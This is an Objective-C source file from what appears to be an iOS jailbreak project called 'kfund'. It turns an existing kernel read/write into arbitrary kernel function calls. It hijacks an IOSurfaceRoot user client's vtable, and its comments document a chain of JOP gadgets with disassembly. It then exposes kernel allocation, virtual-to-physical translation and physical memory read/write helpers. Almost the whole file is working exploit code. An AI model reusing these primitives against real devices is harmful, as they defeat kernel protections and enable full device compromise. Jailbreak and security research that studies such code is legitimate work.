//
//  kcall.m
//  kfund
//
//  Created by Seo Hyun-gyu on 1/2/24.
//

#import "kcall.h"
#import <Foundation/Foundation.h>
#import <mach/vm_statistics.h>
#import "offsets.h"
#import "krw.h"
#import "ipc.h"
#import "jailbreak.h"

uint64_t _fake_vtable = 0;
uint64_t _fake_client = 0;
mach_port_t _user_client = 0;
uint64_t _allocated_kmem = 0;

uint64_t zm_fix_addr_kalloc(uint64_t addr) {
//    uint64_t kmem = off_unk_kallocated_data + get_kslide();
    uint64_t zm_alloc = _allocated_kmem;//kread64(kmem);    //idk?
    printf("zm_alloc (zm_fix_addr_kalloc): 0x%llx\n", zm_alloc);
    uint64_t zm_stripped = zm_alloc & 0xffffffff00000000;

    return (zm_stripped | ((addr) & 0xffffffff));
}

uint64_t init_kcall(void) {
    uint64_t add_x0_x0_0x40_ret_func = off_add_x0_x0_0x40_ret + get_kslide();
    
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (service == IO_OBJECT_NULL){
      printf(" [-] unable to find service\n");
      exit(EXIT_FAILURE);
    }
    _user_client = 0;
    kern_return_t err = IOServiceOpen(service, mach_task_self(), 0, &_user_client);
    if (err != KERN_SUCCESS){
      printf(" [-] unable to get user client connection\n");
      exit(EXIT_FAILURE);
    }
    IOObjectRelease(service);
    uint64_t uc_port = port_name_to_ipc_port(_user_client);
    uint64_t uc_addr = kread64(uc_port + off_ipc_port_ip_kobject);
    uint64_t uc_vtab = kread64(uc_addr);
    
    if(_fake_vtable == 0) _fake_vtable = off_empty_kdata_page + get_kslide();
    
    for (int i = 0; i < 0x200; i++) {
        kwrite64(_fake_vtable+i*8, kread64(uc_vtab+i*8));
    }
    
    if(_fake_client == 0) _fake_client = off_empty_kdata_page + get_kslide() + 0x1000;
    
    for (int i = 0; i < 0x200; i++) {
        kwrite64(_fake_client+i*8, kread64(uc_addr+i*8));
    }
    kwrite64(_fake_client, _fake_vtable);
    kwrite64(uc_port + off_ipc_port_ip_kobject, _fake_client);
    kwrite64(_fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);

    return 0;
}

uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    uint64_t offx20 = kread64(_fake_client+0x40);
    uint64_t offx28 = kread64(_fake_client+0x48);
    kwrite64(_fake_client+0x40, x0);
    kwrite64(_fake_client+0x48, addr);
    uint64_t returnval = IOConnectTrap6(_user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
    kwrite64(_fake_client+0x40, offx20);
    kwrite64(_fake_client+0x48, offx28);
    return returnval;
}

uint64_t clean_dirty_kalloc(uint64_t addr, size_t size) {
    for(int i = 0; i < size; i+=8) {
        kwrite64(addr + i, 0);
    }
    return 0;
}

uint64_t kcall8(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7) {
    uint64_t empty_kdata_page = off_empty_kdata_page + get_kslide() + 0x2000;
    
    //https://github.com/bazad/memctl/tree/master/src/libmemctl/arm64/jop
    //https://bazad.github.io/2018/04/ios-advanced-kernel-call-jop/
    
//    com.apple.driver.AppleActuatorDriver:__text:FFFFFFF006999380 sub_FFFFFFF006999380
//    com.apple.driver.AppleActuatorDriver:__text:FFFFFFF006999380                 LDP             X5, X8, [X0,#0x10]
//    com.apple.driver.AppleActuatorDriver:__text:FFFFFFF006999384                 LDP             X1, X2, [X0,#0x20]
//    com.apple.driver.AppleActuatorDriver:__text:FFFFFFF006999388                 LDP             X3, X4, [X0,#0x30]
//    com.apple.driver.AppleActuatorDriver:__text:FFFFFFF00699938C                 MOV             X0, X8
//    com.apple.driver.AppleActuatorDriver:__text:FFFFFFF006999390                 BR              X5
    uint64_t GADGET_POPULATE = off_gadget_populate/*0xFFFFFFF006999380*/ + get_kslide();
    
//    com.apple.iokit.IOSCSIBlockCommandsDevice:__text:FFFFFFF00656B634                 STP             X20, X19, [SP,#-0x10+var_10]!
//    com.apple.iokit.IOSCSIBlockCommandsDevice:__text:FFFFFFF00656B638                 STP             X29, X30, [SP,#0x10+var_s0]
//    com.apple.iokit.IOSCSIBlockCommandsDevice:__text:FFFFFFF00656B63C                 ADD             X29, SP, #0x10
//    com.apple.iokit.IOSCSIBlockCommandsDevice:__text:FFFFFFF00656B640                 MOV             X19, X1
//    com.apple.iokit.IOSCSIBlockCommandsDevice:__text:FFFFFFF00656B644                 LDR             X0, [X0,#0x98]
//    com.apple.iokit.IOSCSIBlockCommandsDevice:__text:FFFFFFF00656B648                 LDR             X8, [X0]
//    com.apple.iokit.IOSCSIBlockCommandsDevice:__text:FFFFFFF00656B64C                 LDR             X8, [X8,#0x7C0] <- gadget_populate
//    com.apple.iokit.IOSCSIBlockCommandsDevice:__text:FFFFFFF00656B650                 BLR             X8
//    com.apple.iokit.IOSCSIBlockCommandsDevice:__text:FFFFFFF00656B654                 STR             X0, [X19]
//    com.apple.iokit.IOSCSIBlockCommandsDevice:__text:FFFFFFF00656B658                 MOV             W0, #0
//    com.apple.iokit.IOSCSIBlockCommandsDevice:__text:FFFFFFF00656B65C                 LDP             X29, X30, [SP,#0x10+var_s0]
//    com.apple.iokit.IOSCSIBlockCommandsDevice:__text:FFFFFFF00656B660                 LDP             X20, X19, [SP+0x10+var_10],#0x20
//    com.apple.iokit.IOSCSIBlockCommandsDevice:__text:FFFFFFF00656B664                 RET
    uint64_t GADGET_PROLOGUE = off_gadget_prologue/*0xFFFFFFF00656B634*/ + get_kslide();
    
    uint64_t MOV_X16_X1__BR_X2 = off_mov_x16_x1__br_x2/*0xFFFFFFF0064231C4*/ + get_kslide();
    uint64_t MOV_X15_X3__BR_X4 = off_mov_x15_x3__br_x4/*0xFFFFFFF0064DD47C*/ + get_kslide();
    uint64_t MOV_X7_X16__BR_X2 = off_mov_x7_x16__br_x2/*0xFFFFFFF0064D8308*/ + get_kslide();
    uint64_t MOV_X16_X3__BR_X4 = off_mov_x16_x3__br_x4/*0xFFFFFFF006408AC0*/ + get_kslide();
    uint64_t MOV_X5_X16__BR_X15 = off_mov_x5_x16__br_x15/*0xFFFFFFF006328B58*/ + get_kslide();
    
    kwrite64(empty_kdata_page, empty_kdata_page);
    kwrite64(empty_kdata_page + 0x98, empty_kdata_page);
    kwrite64(empty_kdata_page + 0x7c0, GADGET_POPULATE);
    kwrite64(empty_kdata_page + 0x10, MOV_X16_X1__BR_X2);
    kwrite64(empty_kdata_page + 0x18, empty_kdata_page + 0x800);
    kwrite64(empty_kdata_page + 0x20, x7);
    kwrite64(empty_kdata_page + 0x28, MOV_X15_X3__BR_X4);
    kwrite64(empty_kdata_page + 0x30, addr);
    kwrite64(empty_kdata_page + 0x38, GADGET_POPULATE);
    
    kwrite64(empty_kdata_page + 0x810, MOV_X7_X16__BR_X2);
    kwrite64(empty_kdata_page + 0x818, empty_kdata_page + 0x840);
    kwrite64(empty_kdata_page + 0x820, 0);
    kwrite64(empty_kdata_page + 0x828, MOV_X16_X3__BR_X4);
    kwrite64(empty_kdata_page + 0x830, x5);
    kwrite64(empty_kdata_page + 0x838, GADGET_POPULATE);
    kwrite64(empty_kdata_page + 0x850, MOV_X5_X16__BR_X15);
    kwrite64(empty_kdata_page + 0x858, x0);
    kwrite64(empty_kdata_page + 0x860, x1);
    kwrite64(empty_kdata_page + 0x868, x2);
    kwrite64(empty_kdata_page + 0x870, x3);
    kwrite64(empty_kdata_page + 0x878, x4);
    
    uint64_t STORED_RET = empty_kdata_page + 0x100;
    kcall(GADGET_PROLOGUE, empty_kdata_page, STORED_RET, 0, 0, 0, 0, 0);
    uint64_t kcall_ret = kread64(STORED_RET);
    
    clean_dirty_kalloc(empty_kdata_page, 0x1000);
    
    return kcall_ret;
}

uint64_t kalloc(size_t ksize) {
    uint64_t allocated_kmem = kcall8(off_kalloc_data_external + get_kslide(), ksize, 1, 0, 0, 0, 0, 0, 0);
    return allocated_kmem;
}

void kfree(uint64_t kaddr, size_t ksize) {
    kcall(off_kfree_data_external + get_kslide(), kaddr, ksize, 0, 0, 0, 0, 0);
}

int kalloc_using_empty_kdata_page(void) {
    init_kcall();

    uint64_t allocated_kmem[2] = {0, 0};
    allocated_kmem[0] = kalloc(0x1000);
    allocated_kmem[1] = kalloc(0x1000);
    
    IOServiceClose(_user_client);
    _user_client = 0;
    usleep(10000);

    clean_dirty_kalloc(_fake_vtable, 0x1000);
    clean_dirty_kalloc(_fake_client, 0x1000);
    
    _fake_vtable = allocated_kmem[0];
    _fake_client = allocated_kmem[1];

    return 0;
}

bool is_same_boottime(NSString* path) {
    if(access(path.UTF8String, F_OK) != 0)
        return false;
    
    NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:path];
    NSString *saved_boot_time = [dict objectForKey:@"boot_time"];
    if(strcmp(get_boottime(), saved_boot_time.UTF8String) != 0)
        return false;
    
    return true;
}

int prepare_kcall(void) {
    NSString* save_path = [NSString stringWithFormat:@"%@/Documents/kfund.plist", NSHomeDirectory()];//@"/tmp/kfd-arm64.plist";
    if(is_same_boottime(save_path)) {
        printf("boot_time is same, obtaining offsets from kfund.plist\n");
        NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:save_path];
        _fake_vtable = [dict[@"kcall_fake_vtable_allocations"] unsignedLongLongValue];
        _fake_client = [dict[@"kcall_fake_client_allocations"] unsignedLongLongValue];
    } else {
        printf("boot_time is different, removing kfund.plist\n");
        remove(save_path.UTF8String);
        kalloc_using_empty_kdata_page();
        
        NSDictionary *dictionary = @{
            @"boot_time": @(get_boottime()),
            @"kcall_fake_vtable_allocations": @(_fake_vtable),
            @"kcall_fake_client_allocations": @(_fake_client),
        };
        
        BOOL success = [dictionary writeToFile:save_path atomically:YES];
        if (!success) {
            printf("[-] Failed writeToFile: %s\n", save_path.UTF8String);
            return -1;
        }
        printf("Saved fake_vtable, fake_client for kcall.\n");
        printf("fake_vtable: 0x%llx, fake_client: 0x%llx\n", _fake_vtable, _fake_client);
    }
    
    init_kcall();
    
    return 0;
}

int term_kcall(void) {
    IOServiceClose(_user_client);
    _user_client = 0;
    
    return 0;
}

uint64_t kvtophys(uint64_t kvaddr){
    uint64_t ret;
    uint64_t src = kvaddr;
    
    uint64_t kernel_pmap_min = kread64(get_kernpmap() + 0x10);
    uint64_t kernel_pmap_max = kread64(get_kernpmap() + 0x18);
    
    uint64_t is_virt_src = src >= kernel_pmap_min && src < kernel_pmap_max;
    if(is_virt_src) {
        ret = kcall(off_pmap_find_phys + get_kslide(), get_kernpmap(), src, 0, 0, 0, 0, 0);
        if(ret <= 0) {
            return 0;
        }
        
        uint64_t phys_src = ((uint64_t)ret << vm_kernel_page_shift) | (src & vm_kernel_page_mask);
        return phys_src;
    }
    return 0;
}

uint32_t physread32(uint64_t pa)
{
    return (uint32_t)kcall(off_ml_phys_read_data + get_kslide(), pa, 4, 0, 0, 0, 0, 0);
}

uint64_t physread64(uint64_t pa)
{
    union {
        uint32_t u32[2];
        uint64_t u64;
    } u;

    u.u32[0] = (uint32_t)kcall(off_ml_phys_read_data + get_kslide(), pa, 4, 0, 0, 0, 0, 0);
    u.u32[1] = (uint32_t)kcall(off_ml_phys_read_data + get_kslide(), pa+4, 4, 0, 0, 0, 0, 0);
    return u.u64;
}

void physwrite64(uint64_t paddr, uint64_t value) {
    kcall(off_ml_phys_write_data + get_kslide(), paddr, value, 8, 0, 0, 0, 0);
}

void physwrite32(uint64_t paddr, uint32_t value) {
    kcall(off_ml_phys_write_data + get_kslide(), paddr, value, 4, 0, 0, 0, 0);
}

void physwritebuf(uint64_t paddr, void* input, size_t size)
{
    uint64_t endAddr = paddr + size;
    uint32_t inputOffset = 0;
    unsigned char* inputBytes = (unsigned char*)input;
    
    for(uint64_t curAddr = paddr; curAddr < endAddr; curAddr += 4)
    {
        uint32_t toWrite = 0;
        int bc = 4;
        
        uint64_t remainingBytes = endAddr - curAddr;
        if(remainingBytes < 4)
        {
            toWrite = physread32(curAddr);
            bc = (int)remainingBytes;
        }
        
        unsigned char* wb = (unsigned char*)&toWrite;
        for(int i = 0; i < bc; i++)
        {
            wb[i] = inputBytes[inputOffset];
            inputOffset++;
        }

        physwrite32(curAddr, toWrite);
    }
}
